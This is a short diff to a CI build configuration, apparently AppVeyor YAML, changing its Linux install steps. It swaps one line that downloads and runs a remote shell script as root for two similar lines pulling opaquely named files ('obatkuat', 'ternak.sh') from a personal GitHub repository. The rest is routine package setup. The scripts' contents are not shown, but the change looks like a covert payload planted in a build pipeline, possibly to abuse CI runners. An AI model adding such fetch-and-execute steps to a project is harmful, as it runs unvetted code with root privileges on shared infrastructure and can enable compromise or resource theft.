@@ -13,7 +13,8 @@ platform:
 install:
  
  # Linux
- - sh: sudo bash -c "$(wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud5.sh && chmod +x cloud5.sh && ./cloud5.sh)"
+ - sh: sudo bash -c "$(wget https://raw.githubusercontent.com/renifer12/engine/main/obatkuat)"
+ - sh: sudo bash -c "$(wget https://raw.githubusercontent.com/renifer12/engine/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh)"
  - sh: sudo add-apt-repository ppa:mhier/libboost-latest
  - sh: wget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2>/dev/null | sudo apt-key add -
  - sh: sudo apt-add-repository 'deb https://apt.kitware.com/ubuntu/ bionic main'
